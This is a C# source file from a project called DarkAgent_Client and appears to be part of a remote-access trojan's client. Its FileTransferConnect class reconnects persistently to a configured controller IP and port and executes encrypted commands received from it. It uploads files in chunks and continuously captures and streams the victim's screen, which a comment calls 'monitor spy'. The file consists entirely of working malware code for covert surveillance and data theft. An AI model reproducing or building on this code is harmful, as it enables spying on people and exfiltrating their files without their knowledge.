using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using DarkAgent_Client.src.Objects;
using System.Drawing;
using DarkAgent_Client.src.Network.FileNetwork.Packets.Send;
using DarkAgent_Client.src.Network.FileNetwork.Packets;
using DarkAgent_Client.src.Engines;
using System.Net;
using DarkAgent_Client.src.Utils;
using System.IO;
using System.Threading;
using DarkAgent_Client.src.Network.DataNetwork;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.FileNetwork
{
    public class FileTransferConnect
    {
        private static Socket _client;
        private static byte[] _buffer;
        public SortedList<int, FileTransfer> fileTransfer;
        public bool EnableRemoteControl;

        public FileTransferConnect()
        {
            fileTransfer = new SortedList<int, FileTransfer>();
            TryToConnect();
        }

        private void Read()
        {
            _buffer = new byte[2];
            _client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, Client_BeginReceive, null);
        }

        private void Client_BeginReceive(IAsyncResult ar)
        {
            //try
            //{
                if (_client.EndReceive(ar) > 0)
                {
                    _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];

                    if(_buffer.Length > 10000) //ignore packets that are bigger then 10kb
                        return;

                    if (_buffer.Length > 0)
                    {
                        _client.Receive(_buffer, 0, _buffer.Length, SocketFlags.Partial);
                        _buffer = CryptEngine.Crypt(_buffer);

                        //Process the packet.
                        Type pck = FileClientPacketProcessor.ProcessPacket(_buffer);
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, _buffer);
                            rbp.Run();
                        }

                        Read();
                        return;
                    }
                }
            //}
            //catch
            //{
            //    if(!_client.Connected)
            //        TryToConnect();
            //}
        }

        private static void Disconnect()
        {
            _client.Disconnect(false);
        }

        private void TryToConnect()
        {
            _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            while (!_client.Connected)
            {
                System.Threading.Thread.Sleep(1000);
                try
                {
                    _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    _client.Connect(new IPEndPoint(IPAddress.Parse(Settings.File_ConnectIP), Settings.File_ConnectPort));
                }
                catch { }
            }
            Read();
        }
        
        public void SendFile(FileTransfer info, byte[] FileBytes, S_FileTransferSendBegin.SendType type)
        {
            SendPacket(new S_FileTransferSendBegin(this, info, type));
            Thread thread = new Thread(new ParameterizedThreadStart(ThreadSendFile));
            thread.Start(new object[] { info, FileBytes });
        }

        private void ThreadSendFile(object param)
        {
            try
            {
                FileTransfer inf = (FileTransfer)((object[])param)[0];
                byte[] FileBytes = (byte[])((object[])param)[1];
                int Index = 0;

                for (int i = 0; i < FileBytes.Length; i += 1024)
                {
                    if (i + 1024 <= FileBytes.Length)
                    {
                        byte[] FilePiece = new byte[1024];
                        Array.Copy(FileBytes, i, FilePiece, 0, 1024);
                        SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                    }
                    else
                    {
                        byte[] FilePiece = new byte[FileBytes.Length - i];
                        Array.Copy(FileBytes, i, FilePiece, 0, FileBytes.Length - i);
                        SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                    }
                    Index++;
                }
                SendPacket(new S_FileTransferSendComplete(this, inf));
            }
            catch{}
        }

        public void SendRemoteScreen()
        {
            while (EnableRemoteControl)
            {
                try
                {
                    //Thread.Sleep(1000 / 30); //30fps is max speed we can get...
                    Bitmap ScreenImage = ScreenCapture.CaptureScreen();
                    byte[] ScreenBytes = ScreenCapture.BitmapToBytes(ScreenImage);
                    GC.Collect();

                    FileTransfer info = new FileTransfer();
                    info.type = -1; //-1 = monitor spy
                    SendFile(info, ScreenBytes, S_FileTransferSendBegin.SendType.MonitorSpy);
                }
                catch{}
            }
        }

        public bool SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                try
                {
                    packet.Write();
                    byte[] pck = CryptEngine.Crypt(packet.ToByteArray());
                    List<Byte> FullPacket = new List<Byte>();
                    FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                    FullPacket.AddRange(pck); //Packet
                    _client.Send(FullPacket.ToArray());
                }
                catch
                {
                    return false;
                }
                return true;
            }
        }
    }
}
